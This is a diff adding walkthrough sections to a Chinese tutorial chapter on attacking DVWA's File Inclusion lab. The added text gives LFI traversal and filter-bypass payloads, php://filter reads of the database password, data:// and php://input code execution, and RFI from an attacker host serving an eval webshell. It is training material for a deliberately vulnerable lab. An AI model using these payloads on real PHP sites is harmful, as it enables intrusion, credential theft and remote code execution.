@@ -101,6 +101,113 @@ include($theme);          // 包含用户选的主题文件
 
 好，概念咱们搞清楚了，接下来就进入DVWA实战！
 
+### 📍 先看你该访问哪个 URL（三选一）
+
+**本章靶场模块：File Inclusion**（点"某文件"那个下拉框，带 `?page=xxx.php` 参数）。左边栏点 File Inclusion 进入。**⚠️ 本章强烈建议先用 Kali LAMP 搭的同学按 ch04 把 `allow_url_include = On` 打开，否则 RFI 伪协议会直接白屏！**
+
+| 搭建方式 | 本章页面地址 | 你写 shell / 读敏感文件的攻击机 |
+|---|---|---|
+| 🪟 Windows PHPStudy | `http://localhost/dvwa/vulnerabilities/fi/?page=include.php` | Burp Suite + 本地读 `C:\Windows\System32\drivers\etc\hosts` |
+| 🐧 **Kali LAMP ✅** | `http://你的KaliIP/dvwa/vulnerabilities/fi/?page=include.php` | Kali 终端直接构造 URL + Burp Repeater；同机可打伪协议 `php://filter` / `data://` / `expect://` |
+| 🐳 Docker 版 | `http://你的KaliIP:4280/vulnerabilities/fi/?page=include.php` | 同上；容器里可读 `/etc/passwd`、`/var/www/html/config/config.inc.php` 拿数据库密码（⚠️ Docker pull 拉不动？直接换 ch04 §4.5 Kali LAMP 或 §4.7 XAMPP ✅）！|
+
+<svg viewBox="0 0 1100 470" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:980px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1120;">
+  <defs><linearGradient id="fi1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#238636"/><stop offset="100%" stop-color="#0a3716"/></linearGradient><linearGradient id="fi2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#1f6feb"/><stop offset="100%" stop-color="#0b3b8a"/></linearGradient><linearGradient id="fi3" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#f0883e"/><stop offset="100%" stop-color="#823a0b"/></linearGradient><marker id="fig" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#3fb950"/></marker><marker id="fib" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#4490ff"/></marker><marker id="fio" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#f0883e"/></marker></defs>
+  <text x="550" y="34" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial">图 8-1  文件包含全景：LFI 本地读敏感文件 + RFI 远程拿 Shell + 4 条伪协议攻击链</text>
+  <!-- 左：URL 参数构造（攻击机 Kali）-->
+  <rect x="18" y="64" width="248" height="388" rx="14" fill="url(#fi2)" stroke="#4490ff" stroke-width="1.4"/>
+  <text x="142" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">🔨  攻击机 Kali（构造 page=参数）</text>
+  <g font-family="Arial" font-size="11.5" fill="#d9e8ff">
+    <text x="32" y="130" fill="#ffe16b" font-weight="bold">路径一：LFI 本地包含（9 成目标能打 ✅）</text>
+    <rect x="32" y="139" width="220" height="28" rx="5" fill="#000" opacity="0.35"/>
+    <text x="44" y="158" font-family="Consolas,monospace" fill="#ff8b8b">?page=../../../../etc/passwd</text>
+    <rect x="32" y="176" width="220" height="28" rx="5" fill="#000" opacity="0.35"/>
+    <text x="44" y="195" font-family="Consolas,monospace" fill="#ff8b8b">?page=....//....//etc/passwd 双写绕过</text>
+    <text x="32" y="238" fill="#ffe16b" font-weight="bold">路径二：RFI 远程包含（allow_url_include=On 才生效 🔥）</text>
+    <rect x="32" y="248" width="220" height="28" rx="5" fill="#000" opacity="0.35"/>
+    <text x="44" y="267" font-family="Consolas,monospace" fill="#c7a6ff">?page=http://你的KALI_IP/shell.txt</text>
+    <text x="32" y="310" fill="#ffe16b" font-weight="bold">路径三：4 条 PHP 伪协议（本章灵魂 ✨）</text>
+    <rect x="32" y="320" width="220" height="24" rx="5" fill="#000" opacity="0.35"/>
+    <text x="44" y="338" font-family="Consolas,monospace" fill="#9de8b0">php://filter/read=convert.base64-encode/resource=index.php</text>
+    <rect x="32" y="348" width="220" height="24" rx="5" fill="#000" opacity="0.35"/>
+    <text x="44" y="366" font-family="Consolas,monospace" fill="#9de8b0">php://input [POST] &lt;?php system('id')?&gt;</text>
+    <rect x="32" y="376" width="220" height="24" rx="5" fill="#000" opacity="0.35"/>
+    <text x="44" y="394" font-family="Consolas,monospace" fill="#9de8b0">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</text>
+    <rect x="32" y="404" width="220" height="24" rx="5" fill="#000" opacity="0.35"/>
+    <text x="44" y="422" font-family="Consolas,monospace" fill="#9de8b0">expect://ls%20-la 需 expect 扩展（Low 偶尔见）</text>
+  </g>
+  <!-- 中：DVWA include.php 核心代码 -->
+  <rect x="286" y="64" width="530" height="388" rx="14" fill="#10173a" stroke="#a371f7" stroke-width="1.2"/>
+  <text x="551" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">🧠  DVWA /vulnerabilities/fi/index.php（服务端 include 核心 👇）</text>
+  <g font-family="Consolas,monospace" font-size="11.5">
+    <rect x="304" y="114" width="494" height="86" rx="6" fill="#000" opacity="0.6"/>
+    <text x="320" y="136" fill="#c7a6ff">// $file = $_GET['page'];  ← 用户完全可控</text>
+    <text x="320" y="154" fill="#c7a6ff">// LOW：直接 include 无任何校验</text>
+    <text x="320" y="172" fill="#9de8b0">include( $file );   //  ← PHP 抄它！是代码执行就跑</text>
+    <text x="320" y="190" fill="#ffe16b">if( $file != "include.php" ) echo "Wrong file...";</text>
+    <text x="551" y="222" text-anchor="middle" fill="#ffd089" font-family="Arial" font-weight="bold" font-size="13">📌  防护梯度对比（关键差异在这 👇）</text>
+    <g font-family="Arial" font-size="11">
+      <rect x="304" y="234" width="120" height="98" rx="6" fill="#3bff9a18" stroke="#3bff9a"/>
+      <text x="364" y="256" text-anchor="middle" font-weight="bold" fill="#3bff9a">LOW 🌱</text><text x="314" y="274">· 直接 include</text><text x="314" y="290">· 全部路径/伪协议/RFI 通吃</text><text x="314" y="306">· allow_url=On 就 RCE ✅</text><text x="314" y="322">· http/https/file 都 OK</text>
+      <rect x="434" y="234" width="120" height="98" rx="6" fill="#ffe16b18" stroke="#ffe16b"/>
+      <text x="494" y="256" text-anchor="middle" font-weight="bold" fill="#ffe16b">MED 🌿</text><text x="444" y="274">· str_replace("../","")</text><text x="444" y="290">· 双写 ....// 可绕</text><text x="444" y="306">· http:// 替换空 =&gt; hthttpttp://</text><text x="444" y="322">· 伪协议仍畅通</text>
+      <rect x="564" y="234" width="120" height="98" rx="6" fill="#ffa36b18" stroke="#ffa36b"/>
+      <text x="624" y="256" text-anchor="middle" font-weight="bold" fill="#ffa36b">HIGH 🌳</text><text x="574" y="274">· 必须以 file.php 开头</text><text x="574" y="290">· 或白名单 include.php</text><text x="574" y="306">· 但 file%00.txt 截断！&lt;php5.3</text><text x="574" y="322">· %00 截断 + SMB include</text>
+      <rect x="694" y="234" width="104" height="98" rx="6" fill="#ff6b8a18" stroke="#ff6b8a"/>
+      <text x="746" y="256" text-anchor="middle" font-weight="bold" fill="#ff6b8a">IMPOSS</text><text x="704" y="274">· 白名单数组仅含4个</text><text x="704" y="290">· in_array($file,$whitelist)</text><text x="704" y="306">· === 严格等于</text><text x="704" y="322">· 真正的安全写法</text>
+    </g>
+    <text x="551" y="360" text-anchor="middle" fill="#d5b8ff" font-family="Arial" font-weight="bold" font-size="13">💡 核心灵魂：include() 只要能读进字符串，就会当作 PHP 代码执行！所以：</text>
+    <text x="551" y="382" text-anchor="middle" fill="#ff8b8b" font-family="Arial" font-weight="bold">① LFI → 读配置 → ② 配和文件上传 → ③ 包含上传的图片马 → ④ RCE 服务器！🧨</text>
+  </g>
+  <!-- 右：攻击结果 -->
+  <g>
+    <line x1="266" y1="155" x2="286" y2="155" stroke="#f0883e" stroke-width="2.2" marker-end="url(#fio)"/>
+    <line x1="266" y1="260" x2="286" y2="260" stroke="#a371f7" stroke-width="2.2" marker-end="url(#fig)"/>
+    <line x1="266" y1="335" x2="286" y2="335" stroke="#3fb950" stroke-width="2.2" marker-end="url(#fib)"/>
+    <rect x="836" y="64" width="246" height="388" rx="14" fill="url(#fi3)" stroke="#f0883e" stroke-width="1.4"/>
+    <text x="959" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">📺  浏览器回显（你拿到的战果 🏆）</text>
+    <g font-family="Consolas,monospace" font-size="11.2" fill="#fff5e6">
+      <rect x="852" y="114" width="214" height="92" rx="6" fill="#000" opacity="0.55"/>
+      <text x="866" y="134" fill="#9de8b0" font-weight="bold" font-family="Arial">① LFI 读 /etc/passwd：</text>
+      <text x="866" y="152">root:x:0:0:root:/root:/bin/bash</text>
+      <text x="866" y="168">www-data:x:33:33:www:/var/www</text>
+      <text x="866" y="184">mysql:x:999:999:...</text>
+      <text x="866" y="200" fill="#ffd700">拿到用户列表 ✅</text>
+      <rect x="852" y="214" width="214" height="72" rx="6" fill="#000" opacity="0.55"/>
+      <text x="866" y="234" fill="#ff8b8b" font-weight="bold" font-family="Arial">② php://filter 读源码：</text>
+      <text x="866" y="252">PD9waHANCi8vIERWV0...</text>
+      <text x="866" y="268">base64 还原后看到 db_password ✅</text>
+      <text x="866" y="282" fill="#ffd700">拿到 config.inc.php 密码！🚨</text>
+      <rect x="852" y="296" width="214" height="76" rx="6" fill="#000" opacity="0.55"/>
+      <text x="866" y="316" fill="#c7a6ff" font-weight="bold" font-family="Arial">③ data:// 直接 RCE：</text>
+      <text x="866" y="334">uid=33(www-data) gid=33(www-data)</text>
+      <text x="866" y="350">Linux kali 6.8.0 #1 SMP PREEMPT_DYNAMIC</text>
+      <text x="866" y="366" fill="#ffd700">id/uname -a 都执行成功！🎉</text>
+      <rect x="852" y="380" width="214" height="60" rx="6" fill="#000" opacity="0.55"/>
+      <text x="866" y="400" fill="#7ce8a0" font-weight="bold" font-family="Arial">④ LFI + 上传图片马：</text>
+      <text x="866" y="418">?page=../../hackable/uploads/shell.jpg</text>
+      <text x="866" y="434" fill="#ff8b8b" font-weight="bold" font-family="Arial">WebShell 落地 💀 getshell！</text>
+    </g>
+  </g>
+</svg>
+
+> 🔥 **Kali 同学本章速查命令（Low 级别一气呵成 ✅）：**
+> ```bash
+> # 1. 最经典 LFI 读敏感文件（直接浏览器地址栏打）
+> http://你的KaliIP/dvwa/vulnerabilities/fi/?page=../../../../../../../etc/passwd
+> http://你的KaliIP/dvwa/vulnerabilities/fi/?page=../../../../../../../var/www/html/dvwa/config/config.inc.php
+>
+> # 2. php://filter 拿 config.inc.php 的 Base64（防乱码防截断）
+> http://你的KaliIP/dvwa/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=../config/config.inc.php
+> # 结果粘到终端解码：echo 'PD9waHA...' | base64 -d  就能看到 DB 密码
+>
+> # 3. data:// 直接 RCE（确保 allow_url_include = On）
+> echo -n "<?php system('id;uname -a;whoami'); ?>" | base64 -w0
+> # 输出 PD9waHAgc3lzdGVtKCdpZDt1bmFtZSAtYTt3aG9hbWknKTsgPz4=
+> # 然后构造 URL：
+> http://你的KaliIP/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCd...
+> ```
+
 ---
 
 ## 8.2 文件包含基础：PHP里的四大"抄作业"函数
@@ -244,6 +351,29 @@ allow_url_include = On
 ---
 
 ## 8.4 Low级别通关：初体验文件包含的威力
+
+#### 🐧 Kali / Docker 环境先做 30 秒预检 ✅（RFI / 伪协议成败就看这一步！）
+
+文件包含是**最吃 PHP 配置**的一章，`allow_url_include = Off` 的时候 RFI + `data://` / `expect://` 全白给！先在你 Kali 终端跑 4 条命令踩坑：
+
+```bash
+# ① 查当前 php.ini 里两个最关键开关（Kali LAMP 默认路径）
+PHP_INI=/etc/php/$(php -v | head -n1 | grep -oP '\d+\.\d+')/apache2/php.ini
+echo "=== 你的 PHP 配置（没开的后面必须按 ch04 改！）==="
+grep -E "allow_url_(fopen|include)" $PHP_INI
+
+# ② 重启 Apache 让修改生效（Kali LAMP）
+sudo systemctl restart apache2 && echo "Apache 重启 OK ✅"
+
+# ③ 在 Apache 根目录放一个 shell.txt 做 RFI 测试（本章要用）
+echo '<?php echo "=== RFI OK ==="; system("id; uname -a; pwd"); ?>' | sudo tee /var/www/html/shell.txt > /dev/null
+curl -s "http://127.0.0.1/shell.txt" | head -n2
+
+# ④ Docker 同学快速看容器内的 PHP 配置
+docker exec dvwa-test bash -c "php -i | grep -E 'allow_url_(fopen|include)'" 2>&1 || echo "Docker 默认 allow_url_include=Off，RFI 大概率打不通，先玩 LFI + php://filter！"
+```
+
+> 💡 **Kali / Docker 选型建议：** RFI 需要 `allow_url_include=On`，Docker 官方镜像默认是 **Off** 且进容器改 `php.ini` 比较麻烦（要 `docker cp` 进去再重启）。**你现在用的 Kali LAMP 原生版本才是这一章的最佳练习环境 ✅**，Docker 先专注 LFI 本地包含即可。
 
 ### 8.4.1 找到File Inclusion模块
 
@@ -427,6 +557,24 @@ $file = $_GET[ 'page' ];
 这不叫漏洞，这叫"大门敞开欢迎你"😂
 
 所以Low级别就一句话：**你说包含啥，就包含啥，完全没限制。**
+
+### ✅ 表 8-1 · Low 级别通关速查 & 失败对照表（LFI 读敏感文件 + 伪协议读源码/RCE + RFI 拿 Shell）
+
+文件包含 90% 新手第一次就死在 **php.ini 的 allow_url_include 没开**（默认是 Off！），所以步骤 0 必须先做，跳过的话下面 payload 全白给：
+
+| 步骤 | 先做什么 | 点哪里 / 地址栏敲什么 | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 0 | **php.ini 双开关必查！**（LFI 只需要 allow_url_fopen，**php://input / RFI 必须 allow_url_include = On**） | 靶场里先跑 `sudo grep -E "allow_url" /etc/php/8.*/apache2/php.ini`（Kali）。或者新建 info.php 放 /var/www/html/dvwa：`<?php phpinfo(); ?>` → 浏览器访问看这两个值 | 看到：`allow_url_fopen = On` + **`allow_url_include = On`** | 【allow_url_include 是 Off】→ 编辑 php.ini 把 `allow_url_include = Off` 改成 On，然后 `sudo systemctl restart apache2`，刷新 phpinfo 再确认；改完还是 Off？→ 你改的 php.ini 不是 apache2 那个（CLI 和 Apache2 是两个 php.ini！看 phpinfo() 的 Loaded Configuration File 路径） |
+| 1 | 切难度 + 进对模块 + 先确认 "正常包含" 长啥样 | 切 low → Submit → 左边点 **File Inclusion** → 默认 URL 是 `?page=include.php` | 页面显示 4 个文件链接：file1.php / file2.php / file3.php + 一段 "Hello World" 文字 | 【左边没看到 File Inclusion 菜单】→ DVWA 版本不对或 setup.php 没初始化；【页面 PHP 红色 Warning：include(): Failed opening】→ 先跳过，下面步骤会证明这就是漏洞的起点 |
+| 2 | **LFI 经典 payload ① 读 /etc/passwd**（Linux 靶场必测，优先级最高！） | 地址栏把 `page=include.php` 改成 → `?page=../../../../../../etc/passwd`（../ 写 6~8 层，从 /var/www/html/dvwa/vulnerabilities/fi 退到 /） | 页面直接显示 **root:x:0:0:root:/root:/bin/bash 一长串用户信息** ✅ | 【PHP Warning include(../../../../etc/passwd): failed to open stream】→ 原因有 3 种：① ../ 数量不够（写 10 个 ../ 保证退到根）；② 靶场是 Windows！Windows 没有 /etc/passwd，换成下一条 payload；③ 你是 Docker 版 DVWA，真实路径是 /app，所以 4 层 ../ 就到根了，多试试不同数量 |
+| 3 | **LFI 经典 payload ② Windows 靶场读 win.ini**（Windows 专用） | 换成：`?page=..\..\..\..\Windows\win.ini` 或 `?page=C:/Windows/win.ini` | 页面出现 `; for 16-bit app support` + [fonts] 配置 ✅ | 【找不到】→ 系统盘不是 C 盘？→ 换成 D: 或用 `?page=../../../../PHP/php.ini`（知道绝对路径直接写绝对路径是最稳的） |
+| 4 | **php://filter 读源码（🔥 本章考的最多的 payload！）** | 地址栏：<br>`?page=php://filter/read=convert.base64-encode/resource=index.php`<br>（读当前 FI 模块目录下的 index.php 源码） | 页面输出 **一大串 base64（以 PD9waHAg 开头 = `<?php` 的 base64）** | 【啥都没有 / 乱码 / 不是 base64】→ ① resource 路径写错了，试试绝对路径：`resource=/var/www/html/dvwa/vulnerabilities/fi/index.php`；② 你把 `read=` 写成 `reader=` 了，注意拼写；③ 把 base64 复制到 https://www.base64decode.org 验证能不能解码出 PHP 源码（能解就是成功，不要以为乱码就是失败！） |
+| 5 | **进阶：php://filter 读 config 拿数据库密码**（把 DVWA 数据库密码搞到手！） | 读 dvwa/config/config.inc.php（绝对路径最稳，路径按你实际情况改）：<br>`?page=php://filter/convert.base64-encode/resource=/var/www/html/dvwa/config/config.inc.php` | base64 解码后能看到 `$_DVWA[ 'db_password' ] = 'p@ssw0rd';` 之类的真密码 ✅ | 【解码后提示输入不是有效 base64】→ 说明前面 include_path 拼接了别的东西，导致开头有乱码；→ 解码工具里把前面非 base64 字符删掉再解，或者把 resource 写成相对路径 + 足够多的 ../../ |
+| 6 | **php://input 远程代码执行（allow_url_include = On 才生效！）** | Burp 抓包：GET 部分 `?page=php://input`，然后**请求体**（POST body）写一行 PHP：`<?php system('id;uname -a;whoami;pwd'); ?>` → Send | 响应体里直接出现 id、uname、whoami 命令结果 = RCE！ | 【啥响应都没有 / 只有 Warning】→ ① allow_url_include 不是 On（回到步骤 0 查）；② 你用的是 Burp 的 GET 请求但忘了把请求体写进去（php://input 读请求体，POST/PUT 都行，GET 也能有 body）；③ 换成 POST 方法更稳：改成 POST 提交 page 参数 + body 写 php 代码 |
+| 7 | **RFI 远程文件包含（allow_url_fopen + allow_url_include 全 On 才行）** | 攻击机 Kali 里写一句话：`echo '<?php echo "RFI_OK_".php_uname(); ?>' \| sudo tee /var/www/html/shell.txt` → 确保 `sudo systemctl start apache2` 开了 → 靶场地址栏填：<br>`?page=http://Kali攻击机IP/shell.txt` | 页面出现 `RFI_OK_Linux hostname ...` ✅ | 【直接包含失败】→ 排查：① Kali 防火墙挡住 80 端口：`sudo ufw allow 80/tcp`；② 靶场 ping 不通 Kali（网络桥接/NAT 问题）；③ 你写的文件名后缀是 .php 但是你 include 远程 .php 的话，Kali Apache 会先解析成 HTML 返回！→ **必须用 .txt 后缀！**（让远程 Apache 原样返回 PHP 源码，靶场这边收到源码再 include 才会执行） |
+| 8 | **RFI 升级：直接拿 WebShell（蚁剑/菜刀一句话）** | Kali 上 `/var/www/html/cmd.txt` 写：`<?php @eval($_REQUEST['x']); ?>` → 靶场包含：`?page=http://KaliIP/cmd.txt` 先看到空白没报错（成功了）→ 再访问：`?page=http://KaliIP/cmd.txt&x=system('id');` | 访问第二条 URL 出现 id 命令输出 ✅ → 之后 x 参数传啥 PHP 就执行啥，直接用蚁剑连 URL（密码 x）就拿到 Webshell | 【eval 没执行 / Warning】→ ① cmd.txt 真内容是不是 PHP（跑 `cat /var/www/html/cmd.txt` 看）；② `@eval` 前面的 `@` 别删（屏蔽警告）；③ x 参数用 POST 传更隐蔽，改成 POST `x=phpinfo();` 试试 |
+
+> 💡 **Low 查错口诀**：`allow_url_fopen` 管不管理远程文件，`allow_url_include` 管不管理 php://input + RFI。**php://filter 读源码只需要 fopen 开着就行，最稳！** 出现 include path 报错不是坏事——它告诉你当前相对路径的 include 搜索顺序，能帮你猜绝对路径。
 
 ---
 
@@ -1029,6 +1177,22 @@ Medium级别就讲到这儿。总结一下：
 
 还是那句话：**黑名单过滤是不可靠的，总会有办法绕过的。**
 
+### ✅ 表 8-2 · Medium 级别通关速查 & 失败对照表（http:// 被删 + ../ 被删 = 大小写/双写/编码/绝对路径四大绕过法）
+
+DVWA Medium 级 FI 源码里有两个独立的 `str_replace`（重点：**它是大小写敏感的！`str_replace` 不是 `str_ireplace`** — 面试就考这个区别）：① 把 `http://` `https://` 替换成空字符串；② 把 `../` `..\\` 替换成空。按下面 6 条 payload 顺序一个个试，基本都能前 3 个就过：
+
+| 步骤 | 先做什么 | 地址栏敲什么（**按优先级从上往下测！**） | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 0 | 确认 Medium 真的生效 + View Source 抄黑名单 | 切 medium → Submit → 刷新 → 进 FI → View Source 把那两行 str_replace 抄下来 | 确认是 `str_replace( array( 'http://', 'https://' ), '', $file );` + `str_replace( array( '../', '..\\\\' ), '', $file );`（都没有 i 参数 = 大小写敏感）+ Low 版 `?page=../../../../etc/passwd` 和 `?page=http://KaliIP/shell.txt` 都失败 | 【Low payload 还有一个成功】→ 没切到 Medium！重新切 + Ctrl+Shift+R 强刷缓存 |
+| 1 | 绕过法 ① 最经典最稳：**大小写绕过 http 协议**（str_replace 大小写敏感！大写字母一律没匹配） | 直接写：`?page=HTTP://Kali攻击机IP/shell.txt`（全大写 HTTP://）或者混合写 `?page=HtTp://KaliIP/shell.txt` | 包含成功！显示你 shell.txt 里的内容（例：RFI_OK_Linux）✅ | 【还是失败 PHP Warning include(HTTP://...): failed】→ ① 大小写绕过只对 **str_replace** 生效，如果你 View Source 里看到的是 **str_ireplace**（有个 i = 大小写不敏感）那这个方法没用！跳到下一个；② allow_url_include 是不是又变回 Off 了？（有些环境重启 Apache 就恢复，再查一次 phpinfo） |
+| 2 | 绕过法 ②：**双写绕过 http**（`hthttp://tp://xxx` → str_replace 删掉中间那 http:// → 剩下外面的 http://） | 写：`?page=hthttp://tp://KaliIP/shell.txt` 或者 `?page=httpshttps://://KaliIP/shell.txt`（把要匹配的字符串夹在中间）| 包含成功 ✅ | 【没用】→ 你的版本是先删 http 再删 https（顺序不一样），换 `hthttps://tps://`（把 https 也双写）或测一下 **你删完第一层后剩下的字符串会不会刚好又形成 http://** — 可以 Burp Intruder 跑 10 个组合 |
+| 3 | 绕过法 ③ 第二经典：**双写绕过 ../**（Medium 只替换一次 `../` → 不递归！这是 90% DVWA Medium 的真实写法）| Low 的 `?page=../../../../etc/passwd` 改成 → `?page=....//....//....//....//etc/passwd`（每对 ../ 写成 ....//，中间那个 ../ 被删掉，剩下刚好还是 ../） | 显示 /etc/passwd ✅ | 【还失败？】→ 你这版本是 **递归**删 ../（while 循环删到没了为止），那双写没用，跳 ④⑤⑥；另外试试另一种双写布局：`?page=..././..././..././..././etc/passwd` |
+| 4 | 绕过法 ④：**URL 编码绕过 ../**（注意浏览器会自动解一次码，所以要双重编码！） | 单层编码（很多 PHP 环境 `$_GET` 自动解码等于没传）: `..%2f` → 一般不行，所以直接上 **双重编码**：`%252e%252e%252f`（先把 `../` 每个字符 URL 编码得到 %2e%2e%2f，再把 `%` 编码成 %25 = %252e%252e%252f） | 显示 /etc/passwd ✅ | 【还是失败】→ 你的 target 不做二次解码，那换绝对路径绕过（下一条 100% 管用） |
+| 5 | 绕过法 ⑤ 100% 必中（只要你知道绝对路径）：**绝对路径绕过！黑名单完全管不到** | 直接填：`?page=/etc/passwd`（Linux）或 `?page=C:\Windows\win.ini`（Windows）→ **没有 ../ 没有 http，黑名单一个都匹配不上** | 直接出内容 ✅ | 【你不知道靶场绝对路径啊？】→ 这是唯一问题：① 跑 phpinfo() 看 DOCUMENT_ROOT；② 通过步骤 2 的 RFI 拿 shell 之后 `pwd` 看一眼；③ Low 级别 Warning 里会打印 include_path，告诉你当前相对路径拼接前缀是啥 → 推绝对路径 |
+| 6 | 别忘了老朋友 **php://filter**（协议头是 php://，http/https 黑名单一个都不匹配！） | 还是原来的配方：`?page=php://filter/convert.base64-encode/resource=/etc/passwd`（直接写绝对路径，php:// 不会被 Medium 的过滤拦） | 出 base64 = 成功 ✅ → 解码得到文件内容 | 【php://filter 也拦了？】→ 极少 DVWA 版本会写进黑名单，如果真被拦，换 `data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=`（data 伪协议，allow_url_include=On 时可用）|
+
+> 💡 **Medium 查错咒语**：黑名单一个个试，先 http/https 搞大小写/双写 → 再 ../ 搞双写/编码 → 不行就上绝对路径。**真的卡 10 分钟以上，View Source 把那两个 str_replace 数组和参数顺序抄下来，拿个文本编辑器手工模拟 "替换一次后剩下啥" 就知道 payload 该怎么写了。**
+
 ---
 
 ## 8.7 High级别：更严格的过滤怎么破？
@@ -1228,6 +1392,21 @@ High级别就讲到这儿。总结一下：
 - Windows下可以尝试路径长度截断
 
 **重要提示：** High级别的绕过方法可能因环境而异，不一定都能成功。重要的是理解思路——当遇到限制时，要想办法"钻空子"。
+
+### ✅ 表 8-3 · High 级别通关速查 & 失败对照表（必须以 `file` 开头 = fnmatch('file*', $file) 四种绕过思路）
+
+DVWA High 级 FI 源码核心就一行：`if( !fnmatch( 'file*', $file ) && $file != 'include.php' ) die( 'ERROR: File name is not allowed.' );` 即文件名**必须以 `file` 开头**（或就是 include.php），否则直接报错退出。下面四条路线按顺序测：
+
+| 步骤 | 先做什么 | 地址栏敲什么 payload（**按顺序测**） | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 0 | 切 High + 确认 fnmatch 生效 | 切 high → Submit → 刷新 → 进 FI → 先拿 Low 版 `?page=../../../../etc/passwd` 测 | 出现红色 **ERROR: File name is not allowed.** 这句报错 = High 生效 ✅ | 【还是原来的 Warning 没有这个 ERROR 报错】→ 没切到 High！重新切 + 清缓存 + 刷新 |
+| 1 | 🏆 **绕过法 ① 95% 环境必中：`file://` 伪协议 + 绝对路径**（`file://` 本来就以 `file` 开头！fnmatch 完美通过） | Linux 靶场写：<br>`?page=file:///etc/passwd`（三个斜杠：file:// + /etc/passwd 的 /）<br>Windows 靶场写：<br>`?page=file://C:/Windows/win.ini` | 页面显示 /etc/passwd / win.ini 内容 ✅🎉 | 【啥都没出 / Warning】→ ① 三个斜杠别写成两个：`file://etc/passwd` 是错的，必须三个 `/`；② 绝对路径写错了（/etc/passwd 真的存在吗，靶场是 Docker 精简版可能没这个文件 → 换 `file:///etc/hostname` 或 `file:///proc/version`）；③ Windows `file://C:\...` 反斜杠有时会被吞，换成正斜杠 / |
+| 2 | 绕过法 ②：**`file.`（当前目录`.`）+ 路径遍历**（fnmatch 只要开头 4 字符是 file，后面你接啥都行，`.` 指当前目录继续 ../ 遍历） | Linux：<br>`?page=file./../../../../etc/passwd`（注意 file 后面直接一个点一个斜杠，不要空格）<br>或者 `?page=file/../../../etc/passwd`（file 当作目录名，虽然不存在，但 include 会先过 fnmatch 再去路径遍历） | 显示 /etc/passwd 内容 ✅ | 【报错 include(file./../../): failed】→ ① fnmatch 过了（没出 ERROR: File name is not allowed 就是过了！）→ 现在是路径不对，多试几个 ../ 数量（4 个、6 个、8 个 ../）；② 有些 fnmatch 老版本对 `file*` 模式会要求 "file" 后面直接是文件名，所以 `file.` 不如 `file/` 稳，两个版本都试试 |
+| 3 | 绕过法 ③：**PHP < 5.3.4 且 GPC = Off 经典 %00 截断**（老环境面试/CTF 常考，2026 年新环境基本无效，但考点必须会）| payload：<br>`?page=file/etc/passwd%00`（file 开头过 fnmatch，后面 `/etc/passwd` 接真实路径，再用 `%00` 让 PHP 字符串到此截断 → include 时只读到 `/etc/passwd`）<br>或：`?page=file%00../../../../etc/passwd` | 显示 /etc/passwd 内容 ✅ | 【页面显示 Warning include(file%00...): 没有那个文件】→ 你 PHP 版本 >= 5.3.4（2011 年之后的 PHP 就修了这个洞），或者 `magic_quotes_gpc = On` 把 `%00` 自动转义成 `\0`，这个方法就废了，**别在这个 payload 上耗时间，回到 ①② 就行**；想测这个就装 PHP 5.2.x 的古董靶场 |
+| 4 | 绕过法 ④（Windows 专属，偏门考点）：**路径长度截断（_MAX_PATH = 260 字符自动截断）** | 写 `?page=file`，后面拼 `/./` 一共 259 个字符，最后再接 `/../../../etc/passwd`，总长度 > 260 时 Windows 自动截断 `.php` 这种后缀，相当于绕过 | 老 Windows + PHP 5.2 下会成功 | 【基本没人会遇到这种环境】→ 真实环境几乎不考，知道有这个思路就行，没成功直接跳过 |
+| 5 | 还不行？直接拿 file1~3.php 当跳板读源码 + 分析有没有组合漏洞 | DVWA High 还留了 file1.php / file2.php / file3.php 是合法的（file 开头！）→ `?page=php://filter/convert.base64-encode/resource=file1.php` 虽然以 php: 开头过不了 fnmatch，但是如果有 **SSRF 或 CSRF** 能把参数转义就可以；或者切换到别的模块 XSS Stored / 上传漏洞拿 shell | 拿到 Webshell 之后直接读 `/etc/passwd`（不用再受 FI 限制了）| 【以上 4 种全失败 + 你真的想在 High FI 模块上硬刚】→ 先去 View Source 把那行 fnmatch 的**模式字符串**抄下来，仔细看是不是 `file*` 还是 `file*.php`（有些 DVWA fork 版本还加了后缀限制 → 那后缀也被限制，你必须让 file 开头 + .php 结尾，再配合 %00 截断或 file.php 目录遍历）|
+
+> 🔥 **High 级别关键提示：** 只要不出那句 "ERROR: File name is not allowed." = 你已经在 fnmatch 上赢了，剩下的问题就是路径问题（../ 数量 / 绝对路径对不对），不是过滤问题。**看到 File name is not allowed → 一定是你前 4 个字符拼的不是 f-i-l-e 开头**，不用往别的地方想。
 
 ---
 
